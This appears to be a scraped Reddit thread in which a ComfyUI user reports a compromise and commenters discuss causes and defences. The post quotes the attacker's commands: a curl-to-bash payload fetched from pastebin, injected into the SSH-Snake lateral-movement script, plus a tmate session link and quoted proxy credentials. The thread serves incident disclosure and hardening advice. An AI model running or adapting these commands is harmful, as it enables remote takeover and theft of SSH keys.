          "replies": []
        },
        {
          "id": "o12wbyh",
          "author": "msixtwofive",
          "text": "first example is horrible - insanely huge head. The rest are very good.\n\n\nJust tried this with 4b vs 9b and from what I can tell 9b doesn't suffer with the head size issue as much.",
          "score": 1,
          "created_utc": "2026-01-22 17:20:50",
          "is_submitter": false,
          "replies": [
            {
              "id": "o15dlbl",
              "author": "slpreme",
              "text": "true ngl üòÇ",
              "score": 1,
              "created_utc": "2026-01-23 00:29:16",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1370kr",
          "author": "yoomiii",
          "text": "Are you masking the face on the target image?",
          "score": 1,
          "created_utc": "2026-01-22 18:08:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o13mo33",
          "author": "TechnologyGrouchy679",
          "text": "I noticed in your workflow you are using the \\`BasicScheduler\\` node as opposed to the \\`Flux2Scheduler\\` node that is used in the official Flux.2 Klein workflows.  Any particular reason for this?",
          "score": 1,
          "created_utc": "2026-01-22 19:17:53",
          "is_submitter": false,
          "replies": [
            {
              "id": "o15dhs8",
              "author": "slpreme",
              "text": "i find it to get slightly better results (with 5 shift) in my testing. you should test it yourself to know for sure :)",
              "score": 1,
              "created_utc": "2026-01-23 00:28:45",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o160lmv",
          "author": "krsnt8",
          "text": "Better than Qwen faceswap???",
          "score": 1,
          "created_utc": "2026-01-23 02:36:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o16lqvs",
          "author": "orangeflyingmonkey_",
          "text": "tried using it but all the 'body' images are being cropped to 432x1280 so the head swap fails.",
          "score": 1,
          "created_utc": "2026-01-23 04:41:32",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o179il1",
          "author": "Temporary_Mud_6722",
          "text": "–ø–ª–æ—Ö–∞—è...",
          "score": 1,
          "created_utc": "2026-01-23 07:45:19",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o180mqd",
          "author": "imaginationking",
          "text": "my issue with it, is the size of the head usually not realistic... not sure if there is a custom node that can fix that",
          "score": 1,
          "created_utc": "2026-01-23 11:46:39",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1c3svd",
              "author": "slpreme",
              "text": "prompting can be improved. i would also get a reference photo around the same size of head as the target photo",
              "score": 1,
              "created_utc": "2026-01-23 23:57:05",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o19kenu",
          "author": "Upper_Basis_4208",
          "text": "Where is the workflow",
          "score": 1,
          "created_utc": "2026-01-23 16:42:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1h0zel",
          "author": "krigeta1",
          "text": "Can you suggest me some prompts if I want to face+hair and when there is a quality difference or lightning difference, it looks like a good Photoshop? Can you tell me how to fix that?",
          "score": 1,
          "created_utc": "2026-01-24 18:42:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1hyewt",
          "author": "brucebay",
          "text": "BFS is best with Flux2  Klein (a new update for the Lora), at  least for the one time I tried it.  You can also ask it to make changes to the expressions.\n\nHaving said that   the Civit comments are about it being hit or miss.",
          "score": 1,
          "created_utc": "2026-01-24 21:15:08",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1j74oi",
          "author": "lIPunisherIl",
          "text": "looks liek a great photoshop, it sells but still uncanny",
          "score": 1,
          "created_utc": "2026-01-25 00:59:51",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o114m8j",
          "author": "reyzapper",
          "text": "With 3 references images will do a lot better, no need to train loras haha, it reminds me using IPadapter faceID.\n\nsubject : Younger Angelina Jolie (2000s),\n\nIt seems higher dimension of ref images will produce better likeliness, this is 512x512 cropped\n\nklein 9B, 4 steps\n\nhttps://preview.redd.it/xh9a0znm1weg1.png?width=1024&format=png&auto=webp&s=e9d96a3945be7ae466618e3626e48a80f3d82fd5\n\nThose fingers tho üò•üò•",
          "score": 1,
          "created_utc": "2026-01-22 11:48:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o13dyym",
              "author": "Mirandah333",
              "text": "https://preview.redd.it/0yevgsqq3yeg1.png?width=1451&format=png&auto=webp&s=b0138f7db72a83be146f1c0e8110affeb5a6132c\n\n5 reference images, sometimes get close, sometimes better, sometimes bad",
              "score": 2,
              "created_utc": "2026-01-22 18:39:12",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o114y70",
              "author": "slpreme",
              "text": "good idea i didnt think of that",
              "score": 1,
              "created_utc": "2026-01-22 11:51:19",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1r1btm",
              "author": "juandann",
              "text": "yeah, quite sad the finger performance is not up to par. Do you have solution in fixing those fingers without changing the overall image?",
              "score": 1,
              "created_utc": "2026-01-26 03:07:38",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o11plm1",
          "author": "Xp_12",
          "text": "So does Nicky Cage.\n\n![gif](giphy|hwZ51FKy98qv6)",
          "score": 0,
          "created_utc": "2026-01-22 13:58:57",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o105zvo",
          "author": "Practical-Nerve-2262",
          "text": "Everyone uses Banana now, but this open-source version is great too!",
          "score": -20,
          "created_utc": "2026-01-22 06:40:18",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qn4w1j",
      "title": "I think my comfyui has been compromised, check in your terminal for messages like this",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/r/comfyui/comments/1qn4w1j/i_think_my_comfyui_has_been_compromised_check_in/",
      "author": "Bender1012",
      "created_utc": "2026-01-26 03:34:04",
      "score": 236,
      "num_comments": 108,
      "upvote_ratio": 0.96,
      "text": "**Root cause has been found, see my latest update at the bottom**\n\nThis is what I saw in my comfyui Terminal that let me know something was wrong, as I definitely did not run these commands:\n\n     got prompt\n    \n    --- –≠—Ç–∞–ø 1: –ü–æ–ø—ã—Ç–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø—Ä–æ–∫—Å–∏ ---\n    \n    –ü–æ–ø—ã—Ç–∫–∞ 1/3: –ó–∞–≥—Ä—É–∑–∫–∞ —á–µ—Ä–µ–∑ 'requests' —Å –ø—Ä–æ–∫—Å–∏...\n    \n    –ê—Ä—Ö–∏–≤ —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω. –ù–∞—á–∏–Ω–∞—é —Ä–∞—Å–ø–∞–∫–æ–≤–∫—É...\n    \n    ‚úÖ TMATE READY\n    \n    \n    SSH: ssh 4CAQ68RtKdt5QPcX5MuwtFYJS@nyc1.tmate.io\n    \n    \n    WEB: https://tmate.io/t/4CAQ68RtKdt5QPcX5MuwtFYJS\n    \n    Prompt executed in 18.66 seconds \n\nCurrently trying to track down what custom node might be the culprit... this is the first time I have seen this, and all I did was run git pull in my main comfyui directory yesterday, not even update any custom nodes.\n\n**UPDATE:**\n\nIt's pretty bad guys. I was able to see all the commands the attacker ran on my system by viewing my .bash_history file, some of which were these:\n\n    apt install net-tools\n    curl -sL https://raw.githubusercontent.com/MegaManSec/SSH-Snake/main/Snake.nocomments.sh -o snake_original.sh\n    TMATE_INSTALLER_URL=\"https://pastebin.com/raw/frWQfD0h\"\n    PAYLOAD=\"curl -sL ${TMATE_INSTALLER_URL} | sed 's/\\r$//' | bash\"\n    ESCAPED_PAYLOAD=${PAYLOAD//|/\\\\|}\n    sed \"s|custom_cmds=()|custom_cmds=(\\\"${ESCAPED_PAYLOAD}\\\")|\" snake_original.sh > snake_final.sh\n    bash snake_final.sh 2>&1 | tee final_output.log\n    history | grep ssh\n\nBasically looking for SSH keys and other systems to get into. They found my keys but fortunately all my recent SSH access was into a tiny server hosting a personal vibe coded game, really nothing of value. I shut down that server and disabled all access keys. Still assessing, but this is scary shit.\n\n**UPDATE 2** - ROOT CAUSE\n\nAccording to Claude, the most likely attack vector was the custom node **[comfyui-easy-use](https://github.com/yolain/ComfyUI-Easy-Use)**. Apparently there is the capability of remote code execution in that node. Not sure how true that is, I don't have any paid versions of LLMs. **Edit:** People want me to point out that this node by itself is normally not problematic. Basically it's like a semi truck, typically it's just a productive, useful thing. What I did was essentially stand in front of the truck and give the keys to a killer. \n\n**More important than the specific node is the dumb shit I did to allow this**: I always start comfyui with the --listen flag, so I can check on my gens from my phone while I'm elsewhere in my house. Normally that would be restricted to devices on your local network, but separately, apparently I enabled DMZ host on my router for my PC. If you don't know, DMZ host is a router setting that basically opens every port on one device to the internet. This was handy back in the day for getting multiplayer games working without having to do individual port forwarding; I must have enabled it for some game at some point. This essentially opened up my comfyui to the entire internet whenever I started it... and clearly there are people out there just scanning IP ranges for port 8188 looking for victims, and they found me. \n\n**Lesson: Do not use the --listen flag in conjunction with DMZ host!**",
      "is_original_content": false,
      "link_flair_text": "Security Alert",
      "permalink": "https://reddit.com/r/comfyui/comments/1qn4w1j/i_think_my_comfyui_has_been_compromised_check_in/",
      "domain": "self.comfyui",
      "is_self": true,
      "comments": [
        {
          "id": "o1rccsp",
          "author": "thenickdude",
          "text": "You shouldn't share those tmate links, because if the malware is still running then anybody can use that link to connect to your computer.",
          "score": 58,
          "created_utc": "2026-01-26 04:12:12",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1sjj60",
              "author": "EconomicsSavings973",
              "text": "<let me check his latest ai generations>\n...\n\n\n![gif](giphy|3ohhwxqQJzrSXnvWoM)",
              "score": 51,
              "created_utc": "2026-01-26 09:53:01",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1rkfy3",
          "author": "Lightningstormz",
          "text": "Holy fuck, keep us updated good luck.",
          "score": 25,
          "created_utc": "2026-01-26 05:04:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1rgvg1",
          "author": "chensium",
          "text": "Can OP let us know which node caused this?",
          "score": 36,
          "created_utc": "2026-01-26 04:40:56",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ri6f1",
              "author": "Bender1012",
              "text": "Haven't gotten there yet... busy doing damage control / blast radius assessment. This was in my WSL which I used to access work stuff...",
              "score": 24,
              "created_utc": "2026-01-26 04:49:25",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1rllpe",
                  "author": "chensium",
                  "text": "Oooh.¬† Ouch.¬† Ya definitely take care of business first.",
                  "score": 11,
                  "created_utc": "2026-01-26 05:12:11",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1siclu",
                  "author": "Clasyc",
                  "text": "No offense, but you must be special in your head, to run random stuff like comfyui and some random scripts in the environment you use for work.",
                  "score": 16,
                  "created_utc": "2026-01-26 09:42:03",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1uo1t6",
              "author": "Violent_Walrus",
              "text": "**OP's behavior caused this, not any node.**\n\nDon't allow direct access to your system from the public internet and this won't happen to you.",
              "score": 9,
              "created_utc": "2026-01-26 17:12:25",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1rd67p",
          "author": "alborden",
          "text": "I guess ComfyUI should probably add a built in security or antivirus feature to scan and prevent the install of nodes etc that have dodgy code.",
          "score": 86,
          "created_utc": "2026-01-26 04:17:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1s04r0",
              "author": "_realpaul",
              "text": "With the speed that comfyui and its ecosystem are moving half the codebase is dodgy. Hell installing python packages without checking versions is already funky. \n\nBest to isolate it and dont grant any network and file access beyond the absolute necessary",
              "score": 41,
              "created_utc": "2026-01-26 07:01:07",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1s5r12",
                  "author": "JoelMahon",
                  "text": "yup, a sandbox / VM / air gapped type solution is basically the only viable one.",
                  "score": 10,
                  "created_utc": "2026-01-26 07:48:26",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1tvslg",
                  "author": "SvenVargHimmel",
                  "text": "this stresses me out so much that my node packs are now being limited to RES4LF, KJNodes and a few others and if there is any features i want i clone the repo and as an LLM to integrate into my custom node pack. \n\nThe ComfyUI Manager in my opinion is one of the biggest culprits. There shouldn't be an auto installer in the frontend. It's madness",
                  "score": 5,
                  "created_utc": "2026-01-26 15:09:44",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1scvxo",
              "author": "TechnoByte_",
              "text": "That's a band-aid fix rather than a real security solution\n\nThey already do that, but it doesn't help at al\n\nThe only way to run ComfyUI securely is in a sandbox such as Docker",
              "score": 12,
              "created_utc": "2026-01-26 08:51:41",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1sdoci",
              "author": "ResponsibleTruck4717",
              "text": "Honestly I would love if comfyui will have some sort of centralized repo where everything is vetted by llm / scripts and etc.",
              "score": 4,
              "created_utc": "2026-01-26 08:58:42",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1wcp4m",
                  "author": "second_time_again",
                  "text": "One of the best LLM use cases I've heard of.",
                  "score": 1,
                  "created_utc": "2026-01-26 21:35:08",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1swjus",
              "author": "Far_Buyer_7281",
              "text": "oh god please no",
              "score": 1,
              "created_utc": "2026-01-26 11:45:10",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1thw2e",
              "author": "Slave669",
              "text": "It already has that. All the nodes in the manager are whitelisted as they have been checked by the Comfyui team. You need to manually change a yaml file to install random nodes, otherwise Comfyui will only let you install from the whitelist.",
              "score": 0,
              "created_utc": "2026-01-26 14:00:27",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1u4g5j",
                  "author": "ChipsAreClips",
                  "text": "There is no way the comfyui team has checked them all, you have misunderstoof something or been misinformed",
                  "score": 3,
                  "created_utc": "2026-01-26 15:48:33",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1rml26",
          "author": "Antique_Juggernaut_7",
          "text": "If you allow an advice for the future -- create a routine of always running ComfyUI (or anything that runs external code) inside a container.\n\nTo learn how to do it, LLMs are your friend. Just ask  ChatGPT what is Docker, how to install it in WSL2, and how to run a container for your ComfyUI folder path.\n\nIt takes 20 minutes to start and you'll likely never stop using it afterwards. It's safer and has the added benefit of you never worrying about breaking dependencies/python environments again.",
          "score": 22,
          "created_utc": "2026-01-26 05:18:52",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1se79n",
              "author": "drupadoo",
              "text": "How do you handle persistsny? Do you keep your comfyui folder ok host so models and nodes stay updated?",
              "score": 3,
              "created_utc": "2026-01-26 09:03:30",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1sfawx",
                  "author": "Antique_Juggernaut_7",
                  "text": "Yes. You just mount the host folder when you run the container. Something like:\n\n`docker run -it -v ~/ComfyUI:/ComfyUI -gpus all --network=host --name comfyui name_of_container_image`\n\nWhere `~/ComfyUI` is the path to the ComfyUI folder in the host PC.\n\nIdeally you should start from a basic container image and build the environment yourself; that way you know exactly what was installed. The simplest way to do that for CUDA machines is to start with a nvidia/cuda docker image, say `13.1.1-cudnn-devel-ubuntu24.04`):\n\n`docker pull nvidia/cuda:13.1.1-cudnn-devel-ubuntu24.04`",
                  "score": 8,
                  "created_utc": "2026-01-26 09:13:43",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1yjz96",
                  "author": "WdPckr-007",
                  "text": "I run this in a compose like this\n\n    services:\n    \n      comfyui-nvidia:\n        image: <my registry url>/comfy:main-latest\n        container_name: comfyui-nvidia\n        restart: unless-stopped\n        deploy:\n          resources:\n            reservations:\n              devices:\n                - driver: nvidia\n                  count: all\n                  capabilities: [gpu]\n        volumes:\n          - /mnt/comfyui_checkpoints:/root/ComfyUI/models/checkpoints\n          - /mnt/comfyui_controlnet:/root/ComfyUI/models/controlnet\n          - /mnt/comfyui_inputs:/root/ComfyUI/input\n          - /mnt/comfyui_loras:/root/ComfyUI/models/loras\n          - /mnt/comfyui_outputs:/root/ComfyUI/output\n          - /mnt/comfyui_workflows:/root/ComfyUI/user/default/workflows\n          - /mnt/upscale_models:/root/ComfyUI/models/upscale_models\n          - /mnt/comfyui_custom_nodes:/root/ComfyUI/custom_nodes\n     \n        environment:\n          - NVIDIA_VISIBLE_DEVICES=all\n          - NVIDIA_DRIVER_CAPABILITIES=compute,utility\n    \n\n  \nhowever so nodes survive between container recreation i have to run a custom entrypoint in the image\n\n    #!/bin/bash\n    cd /root/ComfyUI\n    if [ -d \"custom_nodes\" ]; then\n        echo \"Checking for custom node requirements...\"\n        for dir in custom_nodes/*; do\n            if [ -d \"$dir\" ] && [ -f \"$dir/requirements.txt\" ]; then\n                echo \"Installing requirements for $(basename \"$dir\")...\"\n                pip3 install -r \"$dir/requirements.txt\"\n            fi\n        done\n    fi\n    \n    # Execute the passed command\n    exec \"$@\"",
                  "score": 1,
                  "created_utc": "2026-01-27 04:32:07",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1t6vgr",
              "author": "Lightningstormz",
              "text": "Does a virtual environment like miniconda environments add any similar level of protection like docker?",
              "score": 2,
              "created_utc": "2026-01-26 12:58:10",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1towwk",
                  "author": "Antique_Juggernaut_7",
                  "text": "Nope. A container isolates everything -- OS, files, even memory -- from the host. A python environment is only a selection of which libraries to count as installed.",
                  "score": 3,
                  "created_utc": "2026-01-26 14:36:29",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1robwp",
              "author": "WdPckr-007",
              "text": "I have been there just a fair advance on that path, if you use amd forget about containers its always 80% slower for some reason\n\nNvidia cont is as fast as in the host",
              "score": 2,
              "created_utc": "2026-01-26 05:31:03",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1sfhch",
                  "author": "Antique_Juggernaut_7",
                  "text": "Oh wow. I never deployed on AMD but I'd bet heavily that there is an issue with the docker image being used. Have you tried installing the environment from scratch?",
                  "score": 1,
                  "created_utc": "2026-01-26 09:15:21",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1w5tnw",
              "author": "superstarbootlegs",
              "text": "great, but then lowVRAM has two more layers to go through before it can function, and it will slow it down. I'm sure there are plenty of ways WSL2 and Docker can also go badly in this context too.",
              "score": 1,
              "created_utc": "2026-01-26 21:04:36",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1wkiyp",
                  "author": "Antique_Juggernaut_7",
                  "text": "That's not exactly how this works. The overhead should be straightforward and small, largely CPU-bound related to OS-level calls. Containerization should not touch the GPU at all (beyond using whatever libraries you installed in the container).\n\nIn fact I'd argue it is quite possible that containerization *improves* GPU use as you are dealing with a lot less driver/library bloat than you would if you're using the host machine directly for everything you do.\n\nYou are right in the sense that, in WSL2, there are a few strange issues that stem out of the emulated Linux environment. For example, there is a weird cap on RAM speed that come from the way WSL2 works. But you can essentially the same WSL2 performance with a docker container inside it.",
                  "score": 2,
                  "created_utc": "2026-01-26 22:10:12",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1s6m46",
          "author": "GrapplingHobbit",
          "text": "What's the confidence level in it being the easy-use nodes?  That's a pretty popular and well-starred repository.",
          "score": 20,
          "created_utc": "2026-01-26 07:55:49",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1sds13",
              "author": "shroddy",
              "text": "From what is known right now, easy-use is \"only\" vulnerable when the comfyui instance is accessible online, which is probably true for many custom nodes because the 's' in comfyui stands for security.¬†\n\n\nIf there is really malware present in easy-use, we can consider the comfyui node ecosystem as failed, as even \"only use well known nodes by trusted developers\" no longer cuts it.¬†",
              "score": 16,
              "created_utc": "2026-01-26 08:59:37",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1so5k5",
                  "author": "lumpxt",
                  "text": "It's not the node ecosystem that failed, it's \"very simplified remote access without any reliable auth layer and having disabled network protection layers\" that was the issue.",
                  "score": 8,
                  "created_utc": "2026-01-26 10:34:33",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1svq2m",
                  "author": "SearchTricky7875",
                  "text": "I doubt it is easy-use node, if there is any vulnerability,  it would have been flagged early by many developers, as OP is using claude code, the agent either installed some malware or modified the 'easy-use' code to customize it, there comes the vibe code horror, without understanding what the agent is doing can be a nightmare.",
                  "score": 5,
                  "created_utc": "2026-01-26 11:38:39",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1roucu",
          "author": "Tam1",
          "text": "Some more info for you on SSH Snake and what else it might have scanned and found:\nBash History:\tParses ~/.bash_history for previous ssh, scp, or rsync commands to find usernames and IPs.\nSSH Configs\t:Reads ~/.ssh/config to find host aliases and specific IdentityFile paths.\nNetwork Discovery:\tUses ip neigh (ARP) and getent to find other active devices on the local network.\nD-Block Scan:\tIf configured, it will \"fuzz\" the last octet of the current IP (e.g., 192.168.1.0-255) to find live hosts.\nHashed Hosts:\tIt even tries to crack/brute-force hashed entries in known_hosts by comparing them against discovered IPs.\n\nOn top of that the script is essentially fileless. It exists in memory (as a variable) and moves through SSH pipes without needing to be written to a permanent file on the target machine in many configurations. This means looking at file modifications alone may not help you chart the attack path. \n\nDo you have Defender running?\n\nThAat tmux script has hard coded credentials in it too: i76qPr:Lt1t3TZZhR, which means the person who wrote this is probably using a specific, private proxy infrastructure to \"tunnel\" out of your network and its running with -d to make it a hidden background session too so spotting if its active will be a challenge. \n\nWould be good to get a full list of all your nodes or extensions asap.",
          "score": 14,
          "created_utc": "2026-01-26 05:34:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1r7d21",
          "author": "nvmax",
          "text": "Here is the breakdown of what is happening:\n\n1. What is tmate?\ntmate is an open-source tool that creates a \"terminal sharing\" session. It establishes a secure tunnel from a local machine to the internet, allowing others to access that specific terminal remotely via SSH or a web browser.\n\n2. Breakdown of the Log\nThe \"Proxy\" Phase: The script first tried to download the necessary archive (the tmate binary) using a proxy, likely to bypass firewalls or network restrictions.\n\n‚úÖ TMATE READY: This means the program is now running and the tunnel is open.\n\nSSH Address: This is a direct command someone can paste into their terminal to take full control of that command line.\n\nWEB URL: This is a read/write link that allows anyone with the URL to view or interact with the terminal through a browser.\n\n3. Why is this used?\nLegitimate Use: Developers use it for remote pair programming or debugging code running on a remote server that doesn't have a public IP address.\n\nSecurity Risk: If you did not initiate this, this is a major red flag. This is a common technique used by hackers to establish a \"Reverse Shell.\" It gives them a permanent backdoor into the system to execute commands, steal data, or install malware.\n\n\n\nScrub your pc man, they installed some shit. do not use your pc you dont know what that package was or if it is sending them your files, shut down and wipe save nothing. \n\nyou clearly installed a node that was compromised and ran some malicious shit.",
          "score": 38,
          "created_utc": "2026-01-26 03:42:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1r8s5z",
              "author": "digiden",
              "text": "Is there a way to disable terminal sharing?",
              "score": 4,
              "created_utc": "2026-01-26 03:50:24",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1rbikw",
                  "author": "nvmax",
                  "text": "usually these types of packages are malware and have multiple points of intrusion the best way disconnect from the internet entirely on that pc.. all your data, logins, passwords are probably being stolen as you sit there typing on it.",
                  "score": 11,
                  "created_utc": "2026-01-26 04:06:59",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1rbyxi",
                  "author": "guchdog",
                  "text": "Even if this is all true, this mean anything could have been ran and installed.  Removing it solves the security issue but they could have installed virus, malware, spyware, ransomware, whatever.",
                  "score": 9,
                  "created_utc": "2026-01-26 04:09:48",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1w8441",
              "author": "superstarbootlegs",
              "text": "this is the way. and check all your backups and totally wipe whatever you have to. ruthlessly. and figure out when it got in because you need to get that thing out of your life and it might require a fair bit of forensics to achieve that and not have it show up when you accidently load it up again in a years time from previous work.",
              "score": 1,
              "created_utc": "2026-01-26 21:14:50",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1s1qmy",
          "author": "SearchTricky7875",
          "text": "please dont install any custom node using claude code or any vibe coding tool, first check the custom node rating , popularity then only do install manually. I was victim of this, claude code just installed any node on my system, which someone created only to mine your gpu, there are many mining code spreading all accross github, claude code doesn't check for git stars n popularity, it matches the name n install it, it could be some mining code for sure, popular nodes are safe generally.\n\nI had a bad experience with claude code and last next js vulnerability, it istalled some code and my whole server was down with mining code, I delete one maware, it again got installed, the malware make copies in so many places you ll waste your days figuring it out where it existed, almost after 3 days I had to take backup n reinstall the whole server.",
          "score": 12,
          "created_utc": "2026-01-26 07:14:18",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1snlmg",
          "author": "Clasyc",
          "text": "If you opened your port to the public, the security risk might not come from ComfyUI itself or its nodes, but from the underlying server it runs on‚Äîspecifically the Python library \\`aiohttp\\`. If \\`aiohttp\\` has unpatched vulnerabilities, exposing your server publicly allows attackers to exploit those vulnerabilities to gain unauthorized access or execute malicious code on your machine. Additionally, any other ports you open to other software also become potential attack vectors. So blaming comfyui-easy-use in this specific case seems strange unless you can pinpoint the exact commit where that vulnerability was introduced.",
          "score": 4,
          "created_utc": "2026-01-26 10:29:34",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1wallt",
              "author": "Carnildo",
              "text": "The fact that the malware starts printing immediately after ComfyUI prints \"got prompt\" suggests that the OP's using a node that permits code injection through the prompt, rather than it being a lower-level vulnerability.",
              "score": 2,
              "created_utc": "2026-01-26 21:25:47",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1ul6wy",
          "author": "Violent_Walrus",
          "text": "So you exposed your system to the public internet and then it got compromised? Shocking.",
          "score": 5,
          "created_utc": "2026-01-26 17:00:06",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1si7z8",
          "author": "GasolinePizza",
          "text": "OP, you should probably edit your post, where it's calling out easy-use, to point out the actual issue was giving free access to your ComfyUI to the whole internet. There are a variety of ways to exploit your machine with full ComfyUI access, no easy-use required... especially since that implies they could open up manager and install almost any set of custom nodes on the registry (unless you've manually lowered the security level)\n\nBut now people are in the comments spreading a panic about easy-use being compromised instead.",
          "score": 14,
          "created_utc": "2026-01-26 09:40:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1sqfx6",
              "author": "AssistBorn4589",
              "text": "> actual issue was giving free access to your ComfyUI to the whole internet\n\nThanks to pointing that out, I was really nervous here for short moment.",
              "score": 6,
              "created_utc": "2026-01-26 10:54:27",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1uxrnt",
          "author": "_mayuk",
          "text": "Lol as soon I saw your post I knew that you had the flag  ‚Äîlisten and your ports open lol",
          "score": 3,
          "created_utc": "2026-01-26 17:55:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1wcm4g",
          "author": "artificial-artistry",
          "text": "rgthree has said in his repo that he doesn‚Äôt trust EasyUse repo. Not saying it‚Äôs not on you OP, but it‚Äôs true that some experts don‚Äôt go by just stars alone",
          "score": 3,
          "created_utc": "2026-01-26 21:34:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1sebba",
          "author": "intermundia",
          "text": "Have you reported it to the comfy team?",
          "score": 5,
          "created_utc": "2026-01-26 09:04:32",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1sqhpn",
          "author": "Simonos_Ogdenos",
          "text": "Sorry to hear that OP, comfy is defining not ‚Äòsafe‚Äô and needs some rules of thumb applying to ensure you don‚Äôt fall foul to a bad node, shame to learn the hard way. \nI dropped the easy-use repo into ChatGPT (paid) and had it check the whole codebase, it didn‚Äôt find anything of major concern, although there is some stuff there that may raise a few eyebrows including the use of BiziAir, which has been mentioned before but nothing specific to malware, crypto miners etc. \nI also ran some checks on my own system (process inspection, memory and cpu behaviour, outbound firewall, live network capture and active socket verification), both historically and whilst comfy was running, again no evidence of foul play on my system (I have easy-use installed). Take this with a pinch of salt and it‚Äôs not a confirmation that it‚Äôs definitely a safe node. My rig is Linux headless, UFW capped to local only unless I manually disable temporarily for updates (I have a script for it), comfy bound to LAN only, and belt and braces all ports on my router are closed with only reverse proxy and headscale for my own inbound connectivity when out and about, so almost zero chance anyone is getting in, so my checks might not flag something that would appear on a less secure system.",
          "score": 4,
          "created_utc": "2026-01-26 10:54:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1suftb",
          "author": "i-eat-kittens",
          "text": "If you're going to access your PC/LAN from the internet, you need to run a vpn. The best option is [wireguard](https://www.wireguard.com/).\n\nPlacing your desktop in a DMZ is just asking to be hacked.",
          "score": 3,
          "created_utc": "2026-01-26 11:28:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1v9yee",
              "author": "TechnologyGrouchy679",
              "text": "Word!  I use Tailscale (built on top of WireGuard)",
              "score": 0,
              "created_utc": "2026-01-26 18:46:05",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1rt2wy",
          "author": "prowacko",
          "text": "So you're saying having comfyui\\_easy-use in general was the cause for this? A lot of people have this node so wouldn't this be a wide spread issue? Or was it solely because you opened your ports and enabling DMZ?",
          "score": 5,
          "created_utc": "2026-01-26 06:05:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1rtknm",
              "author": "Bender1012",
              "text": "Combination of all 3. If you do not use the --listen flag and do not forward your comfyui port / DMZ host your PC, you should be fine.",
              "score": 11,
              "created_utc": "2026-01-26 06:09:34",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1sgzrl",
                  "author": "Aggressive-Bother470",
                  "text": "Why were you using dmz host?¬†",
                  "score": 3,
                  "created_utc": "2026-01-26 09:29:28",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1ruro4",
                  "author": "ChromaBroma",
